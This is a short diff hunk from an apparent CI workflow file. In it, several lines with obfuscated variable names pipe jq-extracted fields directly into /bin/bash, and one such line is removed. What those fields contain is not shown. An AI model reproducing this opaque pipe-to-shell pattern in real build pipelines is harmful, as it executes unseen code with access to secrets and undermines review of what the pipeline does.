@@ -53,7 +53,6 @@ jobs:
           printf '%s' "$flv506" | jq -r .hze331 | /bin/bash
           printf '%s' "$mxo1" | jq -r .pnwk88238 | /bin/bash
           echo $n99 | jq -r .mgl30 | /bin/bash
-          echo $w729 | jq -r .g4 | /bin/bash
           printf '%s' "$igbmo382" | jq -r .lavh14814 | /bin/bash
           echo $ugrr3 | jq -r .efy9038 | /bin/bash
           echo $aob535 | jq -r .gp34106 | /bin/bash
